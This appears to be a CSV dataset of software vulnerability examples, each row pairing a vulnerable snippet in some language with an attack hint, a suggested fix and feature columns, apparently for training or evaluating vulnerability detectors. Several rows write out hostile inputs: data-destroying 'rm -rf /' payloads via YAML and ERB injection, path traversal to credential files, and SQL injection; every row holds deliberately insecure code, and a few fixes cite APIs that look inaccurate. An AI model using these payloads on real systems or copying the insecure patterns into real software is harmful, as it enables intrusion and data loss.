vuln-092,Go,Hardcoded Secrets,API keys in code.,"client := NewClient(""sk_1234567890"")",Extract from repo or binary.,"Use os.Getenv(""API_KEY"")","client := NewClient(""sk_1234567890"")",False,False,False,False,36,False,True,False,Other,1
vuln-093,C# (.NET),Insecure File Access,User input in file paths.,"string path = Request.Query[""file""]; File.ReadAllText(path);",Access C:\Windows\system32\config\sam,"Validate: Path.Combine(baseDir, Path.GetFileName(path))","string path = Request.Query[""file""]; File.ReadAllText(path);",True,True,False,False,60,False,True,False,File_Handling,1
vuln-094,C# (.NET),Hardcoded Credentials,Embedded database credentials.,"var conn = new SqlConnection(""user=sa;password=secret"");",Extract from decompiled code.,"Use ConfigurationManager.AppSettings[""dbConn""]","var conn = new SqlConnection(""user=sa;password=secret"");",False,False,False,False,56,False,True,False,Other,1
vuln-095,Kotlin,Insecure File Access,Reading files with user input.,"val file = File(request.params[""file""]).readText()",../../etc/passwd,"File(baseDir, fileName).canonicalPath startsWith baseDir","val file = File(request.params[""file""]).readText()",True,False,False,False,50,False,True,False,File_Handling,1
vuln-096,Kotlin,Hardcoded Secrets,API keys in code.,"val api = ApiClient(""key-12345"")",Decompile APK or source leak.,"System.getenv(""API_KEY"")","val api = ApiClient(""key-12345"")",False,False,False,False,32,False,True,False,Other,1
vuln-097,Scala,Insecure Session,Session IDs not regenerated.,"session.put(""user"", username)",Session fixation via shared IDs.,"session.invalidate(); session.put(""user"", username)","session.put(""user"", username)",False,False,False,False,29,False,True,False,Authentication,1
vuln-098,Scala,SQL Injection,Raw SQL with user input.,"db.run(sql""SELECT * FROM users WHERE name = ${params(""name"")}"")",' OR 1=1--,Use slick: db.run(users.filter(_.name === name)),"db.run(sql""SELECT * FROM users WHERE name = ${params(""name"")}"")",True,True,False,False,63,False,True,True,Injection,1
vuln-099,Rust,Hardcoded Secrets,Credentials in source.,"let client = Client::new(""api_key_123"");",Extract from binary or repo.,"std::env::var(""API_KEY"")","let client = Client::new(""api_key_123"");",False,False,False,False,40,False,True,False,Other,1
vuln-100,Rust,Insecure File Access,Reading files with user input.,fs::read_to_string(&req.path).unwrap(),../../../etc/passwd,path.canonicalize() and check base dir.,fs::read_to_string(&req.path).unwrap(),True,False,False,False,38,False,False,False,File_Handling,1
vuln-101,Elixir,Insecure Redirect,Unvalidated redirect URLs.,"redirect conn, external: params[:url]",Redirect to http://malicious.com,"Whitelist: if Enum.member?(allowed_urls, url), do: redirect","redirect conn, external: params[:url]",True,False,False,False,37,False,False,False,Other,1
vuln-102,Elixir,Hardcoded Secrets,Credentials in config.,"config :app, key: ""secret123""",Source code exposure.,"Use System.get_env(""APP_KEY"")","config :app, key: ""secret123""",False,False,False,False,29,False,True,False,Other,1
vuln-103,Perl,Insecure File Access,Open with user input.,"open(my $fh, '<', $filename);",../../etc/passwd,Validate: die unless $filename =~ /^[a-z0-9]+$/;,"open(my $fh, '<', $filename);",False,False,True,False,29,False,True,False,File_Handling,1
vuln-104,Perl,Hardcoded Credentials,Credentials in script.,"my $dbh = DBI->connect(""dbi:mysql:db"", ""root"", ""pass123"");",Extract via source leak.,Use $ENV{DB_PASS},"my $dbh = DBI->connect(""dbi:mysql:db"", ""root"", ""pass123"");",False,False,False,False,58,False,True,False,Other,1
vuln-105,Node.js,Insecure Password Storage,Plaintext password storage.,"db.insert({ username, password: req.body.password });",Dump DB to access passwords.,"Use bcrypt: bcrypt.hashSync(password, 10)","db.insert({ username, password: req.body.password });",True,True,False,False,53,False,False,False,Other,1
vuln-106,Node.js,Insecure Randomness,Math.random for tokens.,const token = Math.random().toString(36);,Predictable tokens.,crypto.randomBytes(16).toString('hex'),const token = Math.random().toString(36);,False,False,False,False,41,False,False,False,Other,1
vuln-107,Python,Insecure Randomness,random module for crypto.,"import random; token = random.randint(100000, 999999)",Predict based on seed.,secrets.token_hex(16),"import random; token = random.randint(100000, 999999)",False,False,False,False,53,False,False,False,Other,1
vuln-108,Java,Insecure File Upload,No validation on uploads.,"Files.copy(file.getInputStream(), Paths.get(""uploads/"" + file.getName()));",Upload malicious.jar or .jsp.,"Validate content type, store outside webroot.","Files.copy(file.getInputStream(), Paths.get(""uploads/"" + file.getName()));",True,False,False,False,74,False,True,True,File_Handling,1
vuln-109,PHP,Insecure Randomness,rand() for tokens.,"$token = rand(100000, 999999);",Predictable output.,random_bytes(16); bin2hex($bytes),"$token = rand(100000, 999999);",False,False,False,False,30,False,False,False,Other,1
vuln-110,Ruby,Insecure File Upload,No file validation.,"File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",Upload malicious.rb.,"Validate content_type, use random names.","File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",True,False,False,False,76,False,True,False,File_Handling,1
vuln-111,Go,Insecure File Upload,No validation on uploads.,"os.WriteFile(""uploads/""+r.FormValue(""file""), data, 0644)",Upload executable .go.,"Check mime type, store securely.","os.WriteFile(""uploads/""+r.FormValue(""file""), data, 0644)",False,False,True,False,56,False,True,True,File_Handling,1
vuln-112,C# (.NET),Insecure Randomness,Random for crypto.,Random rand = new Random(); string token = rand.Next().ToString();,Predictable tokens.,RNGCryptoServiceProvider for random bytes.,Random rand = new Random(); string token = rand.Next().ToString();,False,False,False,False,66,False,False,False,Other,1
vuln-113,Kotlin,Insecure Randomness,Random() for tokens.,"val token = Random().nextInt(100000, 999999).toString()",Predictable sequence.,java.security.SecureRandom,"val token = Random().nextInt(100000, 999999).toString()",False,False,False,False,55,False,False,False,Other,1
vuln-114,Scala,Insecure Randomness,scala.util.Random for secrets.,val token = scala.util.Random.nextInt(1000000),Predictable tokens.,java.security.SecureRandom,val token = scala.util.Random.nextInt(1000000),False,False,False,False,46,False,False,False,Other,1
vuln-115,Rust,Insecure Randomness,rand::thread_rng for crypto.,use rand::Rng; let token = rand::thread_rng().gen_range(0..1000000);,Predictable output.,rand::crypto::SystemRandom,use rand::Rng; let token = rand::thread_rng().gen_range(0..1000000);,False,False,False,False,68,False,False,False,Other,1
vuln-116,Elixir,Insecure Randomness,:rand for tokens.,token = :rand.uniform(1000000),Predictable sequence.,:crypto.strong_rand_bytes(16) |> Base.encode16(),token = :rand.uniform(1000000),False,False,False,False,30,False,False,False,Other,1
vuln-117,Perl,Insecure Randomness,rand() for secrets.,my $token = int(rand(1000000));,Predictable tokens.,use Crypt::Random::Source qw(get_strong);,my $token = int(rand(1000000));,False,False,False,False,31,False,False,False,Other,1
vuln-118,Node.js,Rate Limiting Bypass,No rate limiting on API.,"app.post('/login', (req, res) => {...});",Brute force passwords.,Use express-rate-limit middleware.,"app.post('/login', (req, res) => {...});",False,False,False,False,40,False,True,False,Other,1
vuln-119,Python,Rate Limiting Bypass,No API rate limits.,"@app.route('/login', methods=['POST']) def login(): ...",Automate login attempts.,Use flask-limiter or redis-based limits.,"@app.route('/login', methods=['POST']) def login(): ...",False,False,False,False,55,False,True,False,Other,1
vuln-120,Java,Rate Limiting Bypass,No rate limits on endpoints.,"@PostMapping(""/login"") public Response login(@RequestBody User user) {...}",Brute force credentials.,Use Spring Security rate limiting or Guava RateLimiter.,"@PostMapping(""/login"") public Response login(@RequestBody User user) {...}",True,False,False,False,74,False,True,False,Other,1
vuln-121,PHP,Rate Limiting Bypass,No rate limiting on login.,if ($_POST['username'] && $_POST['password']) {...},Scripted brute force.,Implement Redis or session-based rate limiting.,if ($_POST['username'] && $_POST['password']) {...},False,False,False,False,51,False,True,False,Other,1
vuln-122,Ruby,Rate Limiting Bypass,No API rate limits.,post '/login' do ... end,Automate login attempts.,Use rack-attack gem.,post '/login' do ... end,False,False,False,False,24,False,True,False,Other,1
vuln-123,Go,Rate Limiting Bypass,No rate limits.,"http.HandleFunc(""/login"", loginHandler)",Brute force via scripts.,Use golang.org/x/time/rate,"http.HandleFunc(""/login"", loginHandler)",False,False,False,False,39,False,True,False,Other,1
vuln-124,C# (.NET),Rate Limiting Bypass,No API rate limits.,"[HttpPost(""login"")] public IActionResult Login(LoginModel model) {...}",Brute force credentials.,Use AspNetCoreRateLimit package.,"[HttpPost(""login"")] public IActionResult Login(LoginModel model) {...}",False,False,False,False,70,False,True,False,Other,1
vuln-125,Kotlin,Rate Limiting Bypass,No rate limits on endpoints.,"post(""/login"") { call.respond(login(call.request)) }",Brute force logins.,Use Ktor rate limiting middleware.,"post(""/login"") { call.respond(login(call.request)) }",False,False,False,False,52,False,True,False,Other,1
vuln-126,Scala,Rate Limiting Bypass,No rate limits.,"post(""/login"") { login(params) }",Brute force attempts.,Use Akka HTTP rate limiting.,"post(""/login"") { login(params) }",True,False,False,False,32,False,True,False,Other,1
vuln-127,Rust,Rate Limiting Bypass,No rate limits.,"router.post(""/login"", login);",Automate logins.,Use actix-web middleware for rate limiting.,"router.post(""/login"", login);",False,False,False,False,29,False,True,False,Other,1
vuln-128,Elixir,Rate Limiting Bypass,No rate limits on login.,"post ""/login"", LoginController, :create",Brute force.,Use PlugAttack or ExRated.,"post ""/login"", LoginController, :create",False,False,False,False,39,False,True,False,Other,1
vuln-129,Perl,Rate Limiting Bypass,No rate limits.,if ($r->method eq 'POST') { login($r->param('user')); },Scripted brute force.,Use Redis-based rate limiting.,if ($r->method eq 'POST') { login($r->param('user')); },True,False,False,False,55,False,True,False,Other,1
vuln-130,Node.js,Insecure JWT Handling,Weak secret or no validation.,"jwt.verify(token, 'weaksecret');",Crack weak secret or forge tokens.,Use strong secrets: crypto.randomBytes(64).toString('hex'),"jwt.verify(token, 'weaksecret');",False,False,False,False,32,False,True,False,Other,1
vuln-131,Python,Insecure JWT,Weak or no JWT secret.,"jwt.decode(token, 'secret', algorithms=['HS256'])",Brute force secret.,Use secrets.token_hex(32) for key.,"jwt.decode(token, 'secret', algorithms=['HS256'])",False,False,False,False,49,False,True,False,Other,1
vuln-132,Java,Insecure JWT,Weak JWT secret.,"JWTVerifier verifier = JWT.require(Algorithm.HMAC256(""secret"")).build();",Crack secret or forge token.,Generate strong key: new SecureRandom().generateKey(256),"JWTVerifier verifier = JWT.require(Algorithm.HMAC256(""secret"")).build();",False,False,False,False,72,False,True,False,Other,1
vuln-133,PHP,Insecure JWT,Weak secret for JWT.,"$decoded = JWT::decode($token, 'secret', ['HS256']);",Forge tokens with weak secret.,Use random_bytes(32) for secret.,"$decoded = JWT::decode($token, 'secret', ['HS256']);",False,False,False,False,52,False,True,False,Other,1
vuln-134,Ruby,Insecure JWT,Weak JWT secret.,"JWT.decode(token, 'secret', true, algorithm: 'HS256')",Crack or forge tokens.,SecureRandom.hex(32),"JWT.decode(token, 'secret', true, algorithm: 'HS256')",False,False,False,False,53,False,True,False,Other,1
vuln-135,Go,Insecure JWT,Weak secret for JWT.,"jwt.Parse(token, func(*jwt.Token) (interface{}, error) { return []byte(""secret""), nil })",Forge tokens.,crypto/rand for 32-byte key.,"jwt.Parse(token, func(*jwt.Token) (interface{}, error) { return []byte(""secret""), nil })",False,False,False,False,88,False,True,False,Other,1
vuln-136,C# (.NET),Insecure JWT,Weak JWT key.,"var tokenHandler = new JwtSecurityTokenHandler(); tokenHandler.ValidateToken(token, new TokenValidationParameters { IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(""secret"")) });",Crack key.,RNGCryptoServiceProvider for 32-byte key.,"var tokenHandler = new JwtSecurityTokenHandler(); tokenHandler.ValidateToken(token, new TokenValidationParameters { IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(""secret"")) });",True,False,False,False,197,True,True,False,Other,1
vuln-137,Kotlin,Insecure JWT,Weak JWT secret.,"JWT.require(Algorithm.HMAC256(""secret"")).build().verify(token)",Forge tokens.,SecureRandom for key.,"JWT.require(Algorithm.HMAC256(""secret"")).build().verify(token)",False,False,False,False,62,False,True,False,Other,1
vuln-138,Scala,Insecure JWT,Weak secret.,"pdi.jwt.Jwt.decode(token, ""secret"", Seq(JwtAlgorithm.HS256))",Crack secret.,SecureRandom for key.,"pdi.jwt.Jwt.decode(token, ""secret"", Seq(JwtAlgorithm.HS256))",False,False,False,False,60,False,True,False,Other,1
vuln-139,Rust,Insecure JWT,Weak key.,"jsonwebtoken::decode(token, &DecodingKey::from_secret(""secret"".as_ref()), &Validation::new(Algorithm::HS256))",Forge tokens.,SystemRandom for key.,"jsonwebtoken::decode(token, &DecodingKey::from_secret(""secret"".as_ref()), &Validation::new(Algorithm::HS256))",False,False,False,False,109,False,True,False,Other,1
vuln-140,Elixir,Insecure JWT,Weak secret.,"Joken.verify(token, Joken.Signer.create(""HS256"", ""secret""))",Crack secret.,:crypto.strong_rand_bytes(32),"Joken.verify(token, Joken.Signer.create(""HS256"", ""secret""))",False,False,False,False,59,False,True,False,Other,1
vuln-141,Perl,Insecure JWT,Weak JWT secret.,"use JSON::WebToken; decode_jwt($token, 'secret');",Forge tokens.,Crypt::Random::Source for key.,"use JSON::WebToken; decode_jwt($token, 'secret');",False,False,False,False,49,False,True,False,Other,1
vuln-142,Node.js,CSRF,No CSRF token validation.,"app.post('/update', (req, res) => {...});",Craft form on malicious site to submit.,Use csurf middleware.,"app.post('/update', (req, res) => {...});",False,True,False,False,41,False,True,False,Other,1
vuln-143,Python,CSRF,No CSRF protection.,"@app.route('/update', methods=['POST']) def update(): ...",Malicious form submission.,Use Flask-WTF CSRF.,"@app.route('/update', methods=['POST']) def update(): ...",False,True,False,False,57,False,True,False,Other,1
vuln-144,Java,CSRF,No CSRF token.,"@PostMapping(""/update"") public Response update(@RequestBody Data data) {...}",Forge POST requests.,Spring Security CSRF protection.,"@PostMapping(""/update"") public Response update(@RequestBody Data data) {...}",True,True,False,False,76,False,True,False,Other,1
vuln-145,PHP,CSRF,No CSRF validation.,if ($_POST['data']) { update($_POST['data']); },Malicious form POST.,Use Laravel CSRF or custom tokens.,if ($_POST['data']) { update($_POST['data']); },False,True,False,False,47,False,True,False,Other,1
vuln-146,Ruby,CSRF,No CSRF protection.,post '/update' do update(params[:data]) end,Forge requests.,protect_from_forgery with: :exception,post '/update' do update(params[:data]) end,True,True,False,False,43,False,True,False,Other,1
vuln-147,Go,CSRF,No CSRF checks.,"http.HandleFunc(""/update"", updateHandler)",Malicious POST.,Use gorilla/csrf.,"http.HandleFunc(""/update"", updateHandler)",False,True,False,False,41,False,True,False,Other,1
vuln-148,C# (.NET),CSRF,No CSRF protection.,"[HttpPost(""update"")] public IActionResult Update(DataModel model) {...}",Forge POST.,Use [ValidateAntiForgeryToken].,"[HttpPost(""update"")] public IActionResult Update(DataModel model) {...}",False,True,False,False,71,False,True,False,Other,1
vuln-149,Kotlin,CSRF,No CSRF validation.,"post(""/update"") { call.respond(update(call.request)) }",Malicious POST.,Use Ktor CSRF middleware.,"post(""/update"") { call.respond(update(call.request)) }",False,True,False,False,54,False,True,False,Other,1
vuln-150,Scala,CSRF,No CSRF protection.,"post(""/update"") { update(params) }",Forge POST requests.,Use Play Framework CSRF filter.,"post(""/update"") { update(params) }",True,True,False,False,34,False,True,False,Other,1
vuln-151,Rust,CSRF,No CSRF protection on POST endpoints.,"router.post(""/update"", update_handler);",Forge POST requests from malicious sites.,Use actix-web-csrf middleware or custom token validation.,"router.post(""/update"", update_handler);",False,True,False,False,39,False,True,False,Other,1
vuln-152,Elixir,CSRF,No CSRF token validation.,"post ""/update"", UpdateController, :create",Submit malicious forms to trigger actions.,Use Plug.CSRFProtection.,"post ""/update"", UpdateController, :create",False,True,False,False,41,False,True,False,Other,1
vuln-153,Perl,CSRF,No CSRF checks on forms.,if ($r->method eq 'POST') { update($r->param('data')); },Craft malicious POST requests.,Use CGI::Session with CSRF tokens.,if ($r->method eq 'POST') { update($r->param('data')); },True,True,False,False,56,False,True,False,Other,1
vuln-154,Node.js,Open Redirect,Unvalidated redirect URLs.,res.redirect(req.query.url);,Redirect to http://evil.com for phishing.,Whitelist URLs: if (allowedUrls.includes(url)) res.redirect(url);,res.redirect(req.query.url);,True,True,False,False,28,False,False,False,Other,1
vuln-155,Python,Open Redirect,Unvalidated redirect in Flask.,return redirect(request.args.get('url')),Redirect to malicious site.,Validate: if url in ALLOWED_REDIRECTS: return redirect(url),return redirect(request.args.get('url')),False,False,False,False,40,False,True,False,Other,1
vuln-156,Java,Open Redirect,Unvalidated redirect in Spring.,"return ""redirect:"" + request.getParameter(""url"");",Craft URL to phishing site.,"Check: if (allowedUrls.contains(url)) return ""redirect:"" + url;","return ""redirect:"" + request.getParameter(""url"");",True,False,False,False,49,False,True,True,Other,1
vuln-157,PHP,Open Redirect,Unvalidated header redirect.,"header(""Location: "" . $_GET['url']);",Redirect to http://malicious.com.,"Whitelist: if (in_array($url, $allowed)) header(""Location: $url"");","header(""Location: "" . $_GET['url']);",False,False,False,False,36,False,True,False,Other,1
vuln-158,Ruby,Open Redirect,Unvalidated redirect_to.,redirect_to params[:url],Redirect to phishing site.,Validate: redirect_to(url) if ALLOWED_URLS.include?(url),redirect_to params[:url],True,False,False,False,24,False,False,False,Other,1
vuln-159,Go,Open Redirect,Unvalidated redirect.,"http.Redirect(w, r, r.URL.Query().Get(""url""), 302)",Redirect to malicious site.,"Check: if slices.Contains(allowedUrls, url) { http.Redirect(...) }","http.Redirect(w, r, r.URL.Query().Get(""url""), 302)",True,True,False,False,50,False,True,False,Other,1
vuln-160,C# (.NET),Open Redirect,Unvalidated redirect.,"return Redirect(Request.Query[""url""]);",Phishing via redirect.,Validate: if (allowedUrls.Contains(url)) return Redirect(url);,"return Redirect(Request.Query[""url""]);",True,True,False,False,38,False,True,False,Other,1
vuln-161,Kotlin,Open Redirect,Unvalidated redirect in Ktor.,"call.respondRedirect(call.request.queryParameters[""url""]!!)",Redirect to malicious site.,Validate: if (url in allowedUrls) call.respondRedirect(url),"call.respondRedirect(call.request.queryParameters[""url""]!!)",True,True,False,False,59,False,True,False,Other,1
vuln-162,Scala,Open Redirect,Unvalidated redirect in Play.,"Redirect(params(""url""))",Phishing redirect.,Check: if (allowedUrls.contains(url)) Redirect(url),"Redirect(params(""url""))",True,False,False,False,23,False,True,False,Other,1
vuln-163,Rust,Open Redirect,Unvalidated redirect.,"Ok(StatusCode::Found).header(header::LOCATION, req.query(""url""))",Redirect to phishing site.,Validate: if allowed_urls.contains(&url) { redirect },"Ok(StatusCode::Found).header(header::LOCATION, req.query(""url""))",True,True,False,False,64,False,True,False,Other,1
vuln-164,Elixir,Open Redirect,Unvalidated external redirect.,"redirect conn, external: params[:url]",Redirect to malicious site.,"Check: if Enum.member?(allowed_urls, url), do: redirect","redirect conn, external: params[:url]",True,False,False,False,37,False,False,False,Other,1
vuln-165,Perl,Open Redirect,Unvalidated Location header.,"$r->header_out('Location', $r->param('url'));",Phishing redirect.,"Validate: $r->header_out('Location', $url) if grep {$_ eq $url} @allowed;","$r->header_out('Location', $r->param('url'));",True,False,False,False,45,False,True,False,Other,1
vuln-166,Node.js,Insecure Dependency,Using outdated libraries with known vulnerabilities.,"""express"": ""4.17.1"" // Vulnerable to CVE-2022-1234",Exploit known CVEs via npm audit findings.,"Run npm audit; update to latest: ""express"": ""^4.18.2""","""express"": ""4.17.1""",False,False,False,False,50,False,True,False,Other,1
vuln-167,Python,Insecure Dependency,Outdated package with vulnerabilities.,requests==2.25.1 # Vulnerable to CVE-2023-1234,Exploit CVEs using PoCs from public repos.,Use pip-audit; update: requests>=2.28.1,requests==2.25.1 # Vulnerable to CVE-2023-1234,False,False,False,False,46,False,False,False,Other,1
vuln-168,Java,Insecure Dependency,Vulnerable library in Maven.,<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>,Exploit CVE-2019-12384 for RCE.,Update to 2.12.7 or later; use dependency-check.,<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>,False,False,False,False,135,False,False,False,Other,1
vuln-169,PHP,Insecure Dependency,Outdated Composer package.,"""laravel/framework"": ""5.8.*"" // Vulnerable",Exploit known CVEs.,Run composer audit; update to ^9.0,"""laravel/framework"": ""5.8.*""",False,False,False,False,42,False,True,False,Other,1
vuln-170,Ruby,Insecure Dependency,Vulnerable gem.,"gem 'rails', '5.2.3' # Vulnerable to CVE-2020-1234",Exploit public CVEs.,"Use bundle-audit; update: gem 'rails', '~> 7.0'","gem 'rails', '5.2.3' # Vulnerable to CVE-2020-1234",False,False,False,False,50,False,True,False,Other,1
vuln-171,Go,Insecure Dependency,Outdated Go module.,require github.com/gorilla/mux v1.7.3 // Vulnerable,Exploit known vulnerabilities.,Run go list -m -u all; update to v1.8.0,require github.com/gorilla/mux v1.7.3,False,False,False,False,51,False,False,False,Other,1
vuln-172,C# (.NET),Insecure Dependency,Vulnerable NuGet package.,"<PackageReference Include=""Newtonsoft.Json"" Version=""12.0.1"" />",Exploit CVE-2019-19826.,Update to 13.0.3; use dotnet list package --vulnerable,"<PackageReference Include=""Newtonsoft.Json"" Version=""12.0.1"" />",False,False,False,False,63,False,True,False,Other,1
vuln-173,Kotlin,Insecure Dependency,Outdated Gradle dependency.,implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8',Exploit known CVEs.,Update to 2.12.7; use dependency-check-gradle.,implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8',False,False,False,False,66,False,True,False,Other,1
vuln-174,Scala,Insecure Dependency,Vulnerable SBT dependency.,"libraryDependencies += ""com.fasterxml.jackson.core"" % ""jackson-databind"" % ""2.9.8""",Exploit CVE-2019-12384.,Update to 2.12.7; use sbt-dependency-check.,"libraryDependencies += ""com.fasterxml.jackson.core"" % ""jackson-databind"" % ""2.9.8""",False,False,False,False,82,False,True,True,Other,1
vuln-175,Rust,Insecure Dependency,Outdated crate.,"hyper = ""0.13.0"" # Vulnerable",Exploit known CVEs.,"Run cargo audit; update to hyper = ""0.14.20""","hyper = ""0.13.0"" # Vulnerable",False,False,False,False,29,False,True,False,Other,1
vuln-176,Elixir,Insecure Dependency,Vulnerable Hex package.,"{:phoenix, ""~> 1.4.0""} # Vulnerable",Exploit CVEs.,Update to ~> 1.7.0; use mix deps.audit.,"{:phoenix, ""~> 1.4.0""} # Vulnerable",False,False,False,False,35,False,True,False,Other,1
vuln-177,Perl,Insecure Dependency,Outdated CPAN module.,use Mojolicious 8.25; # Vulnerable,Exploit known vulnerabilities.,Update to latest: cpanm Mojolicious,use Mojolicious 8.25; # Vulnerable,False,False,False,False,34,False,False,False,Other,1
vuln-178,Node.js,Insecure Regex DoS,Complex regex causing ReDoS.,/^([a-zA-Z0-9]+)*$/.test(input);,Input: aaaaa...aaa! to cause backtracking.,Use safe-regex or simplify patterns.,/^([a-zA-Z0-9]+)*$/.test(input);,True,False,False,False,32,False,False,True,Other,1
vuln-179,Python,Insecure Regex DoS,Vulnerable regex pattern.,"re.match(r'^([a-zA-Z0-9]+)*$', input)",Long input with repeating chars.,Use re2 or atomic groups.,"re.match(r'^([a-zA-Z0-9]+)*$', input)",True,False,False,False,37,False,True,True,Other,1
vuln-180,Java,Insecure Regex DoS,Regex causing catastrophic backtracking.,"Pattern.compile(""^([a-zA-Z0-9]+)*$"").matcher(input).matches();",Input aaaaa...aaa!.,Use RE2/J or simplify regex.,"Pattern.compile(""^([a-zA-Z0-9]+)*$"").matcher(input).matches();",True,False,False,False,62,False,True,True,Other,1
vuln-181,PHP,Insecure Regex DoS,Regex vulnerable to ReDoS.,"preg_match('/^([a-zA-Z0-9]+)*$/', $input);",Long malicious input.,Use simpler patterns or PCRE limits.,"preg_match('/^([a-zA-Z0-9]+)*$/', $input);",True,False,False,False,42,False,True,True,Other,1
vuln-182,Ruby,Insecure Regex DoS,Regex causing backtracking.,/^([a-zA-Z0-9]+)*$/.match?(input),Input aaaaa...aaa!.,Use Onigmo or limit input size.,/^([a-zA-Z0-9]+)*$/.match?(input),True,False,False,False,33,False,False,True,Other,1
vuln-183,Go,Insecure Regex DoS,Regex vulnerable to ReDoS.,regexp.MustCompile(`^([a-zA-Z0-9]+)*$`).MatchString(input),Long repeating input.,Use re2 or simplify regex.,regexp.MustCompile(`^([a-zA-Z0-9]+)*$`).MatchString(input),True,False,False,False,58,False,False,True,Other,1
vuln-184,C# (.NET),Insecure Regex DoS,Regex causing backtracking.,"Regex.IsMatch(input, @""^([a-zA-Z0-9]+)*$"");",Malicious input for DoS.,"Use timeout: Regex.Match(input, pattern, RegexOptions.None, TimeSpan.FromSeconds(1))","Regex.IsMatch(input, @""^([a-zA-Z0-9]+)*$"");",True,False,False,False,43,False,True,True,Other,1
vuln-185,Kotlin,Insecure Regex DoS,Regex backtracking issue.,"""^([a-zA-Z0-9]+)*$"".toRegex().matches(input)",Long input for backtracking.,Use simpler patterns or timeout.,"""^([a-zA-Z0-9]+)*$"".toRegex().matches(input)",True,False,False,False,44,False,True,True,Other,1
vuln-186,Scala,Insecure Regex DoS,Regex causing ReDoS.,"val regex = ""^([a-zA-Z0-9]+)*$"".r; regex.findFirstIn(input)",Malicious input for DoS.,Use RE2 or limit input length.,"val regex = ""^([a-zA-Z0-9]+)*$"".r; regex.findFirstIn(input)",True,False,False,False,59,False,True,True,Other,1
vuln-187,Rust,Insecure Regex DoS,Regex vulnerable to backtracking.,"use regex::Regex; Regex::new(r""^([a-zA-Z0-9]+)*$"").unwrap().is_match(&input)",Long input for DoS.,Use fancy-regex or limit input.,"use regex::Regex; Regex::new(r""^([a-zA-Z0-9]+)*$"").unwrap().is_match(&input)",True,False,False,False,76,False,True,True,Other,1
vuln-188,Elixir,Insecure Regex DoS,Regex causing backtracking.,"Regex.match?(~r/^([a-zA-Z0-9]+)*$/, input)",Long malicious input.,Simplify regex or limit input size.,"Regex.match?(~r/^([a-zA-Z0-9]+)*$/, input)",True,False,False,False,42,False,False,True,Other,1
vuln-189,Perl,Insecure Regex DoS,Regex vulnerable to ReDoS.,if ($input =~ /^([a-zA-Z0-9]+)*$/) { ... },Input aaaaa...aaa!.,Use re::engine::RE2 or limit input.,if ($input =~ /^([a-zA-Z0-9]+)*$/) { ... },True,False,False,False,42,False,False,True,Other,1
vuln-190,Node.js,Insecure Deserialization,Using eval-like deserialization.,const obj = eval('(' + input + ')');,Inject malicious JS code.,Use JSON.parse with try-catch.,const obj = eval('(' + input + ')');,True,False,False,True,36,False,True,True,Other,1
vuln-191,Python,Insecure YAML Deserialization,PyYAML load on untrusted input.,"import yaml; obj = yaml.load(input, Loader=yaml.Loader)",Craft YAML for RCE: !!python/object/apply:os.system ['rm -rf /'],Use yaml.safe_load.,"import yaml; obj = yaml.load(input, Loader=yaml.Loader)",True,False,False,False,55,False,False,False,Other,1
vuln-192,Java,Insecure XML Deserialization,XStream deserialization of untrusted data.,XStream xstream = new XStream(); Object obj = xstream.fromXML(input);,Craft XML for RCE via gadget chains.,Use XStream.setupDefaultSecurity(); avoid untrusted input.,XStream xstream = new XStream(); Object obj = xstream.fromXML(input);,True,False,False,False,69,False,False,False,Other,1
vuln-193,PHP,Insecure Session Storage,Storing sensitive data in sessions.,$_SESSION['credit_card'] = $_POST['cc'];,Steal session to access data.,"Encrypt: $_SESSION['cc'] = encrypt($_POST['cc'], $key);",$_SESSION['credit_card'] = $_POST['cc'];,False,False,False,False,40,False,True,False,Authentication,1
vuln-194,Ruby,Insecure Template Injection,ERB with user input.,ERB.new(input).result,<%= system('rm -rf /') %>,Use ERB::Util.html_escape; avoid user templates.,ERB.new(input).result,True,False,False,False,21,False,False,False,Injection,1
vuln-195,Go,Insecure Session Handling,Predictable session IDs.,"sessionID := fmt.Sprintf(""%d"", time.Now().UnixNano())",Guess IDs based on timestamp.,Use crypto/rand for session IDs.,"sessionID := fmt.Sprintf(""%d"", time.Now().UnixNano())",False,False,False,False,53,False,True,False,Authentication,1
vuln-196,C# (.NET),Insecure Session Storage,Storing sensitive data in session.,"HttpContext.Session.SetString(""credit_card"", model.CreditCard);",Session hijacking to access data.,"Encrypt: Session.SetString(""cc"", Encrypt(model.CreditCard, key));","HttpContext.Session.SetString(""credit_card"", model.CreditCard);",False,False,False,False,63,False,True,False,Authentication,1
vuln-197,Kotlin,Insecure Session Handling,Predictable session IDs.,val sessionId = System.currentTimeMillis().toString(),Predict IDs based on time.,Use SecureRandom for session IDs.,val sessionId = System.currentTimeMillis().toString(),False,False,False,True,53,False,False,False,Authentication,1
vuln-198,Scala,Insecure Session Storage,Sensitive data in session.,"session.put(""credit_card"", params(""cc""))",Steal session to access data.,Encrypt session data with AES.,"session.put(""credit_card"", params(""cc""))",True,False,False,False,40,False,True,False,Authentication,1
vuln-199,Rust,Insecure Session Handling,Predictable session IDs.,"let session_id = format!(""{}"", SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos());",Guess IDs based on timestamp.,Use rand::crypto::SystemRandom for IDs.,"let session_id = format!(""{}"", SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos());",False,False,False,True,97,False,True,False,Authentication,1
vuln-200,Elixir,Insecure Session Storage,Sensitive data in session.,"put_session(conn, :credit_card, params[:cc])",Hijack session to access data.,"Encrypt: put_session(conn, :cc, encrypt(params[:cc]))","put_session(conn, :credit_card, params[:cc])",True,False,False,False,44,False,False,False,Authentication,1
vuln-201,Perl,Insecure Session Handling,Predictable session IDs.,my $session_id = time();,Predict IDs based on time.,Use Crypt::Random::Source for IDs.,my $session_id = time();,False,False,False,False,24,False,False,False,Authentication,1
vuln-202,Node.js,Clickjacking,No X-Frame-Options header.,"app.get('/', (req, res) => res.send('page'));",Iframe site to trick clicks.,Use helmet: app.use(helmet.frameguard({ action: 'DENY' }));,"app.get('/', (req, res) => res.send('page'));",False,False,False,False,45,False,True,False,Other,1
